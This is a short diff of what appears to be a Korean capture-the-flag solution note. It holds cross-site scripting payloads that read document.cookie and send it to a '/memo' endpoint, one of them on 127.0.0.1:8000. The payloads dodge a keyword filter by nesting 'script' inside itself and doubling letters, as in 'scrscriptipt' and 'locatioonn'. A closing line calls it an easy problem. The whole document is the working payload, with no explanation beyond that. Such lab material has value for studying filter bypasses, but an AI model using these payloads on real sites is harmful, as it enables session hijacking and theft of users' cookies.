@@ -1,4 +1,4 @@
 <scrscriptipt>locatioonn.href='/memo?memo='+document.cookie</scriscriptpt>
 또는
-<Script>locatiOn.href="http://127.0.0.1:8000/memo?memo=hello"+document.cookie;</Script> 
+<Script>locatioon.href="http://127.0.0.1:8000/memo?memo=hello"+document.cookie;</Script> 
 머리만 잘 쓰면 되는 쉬운 문제
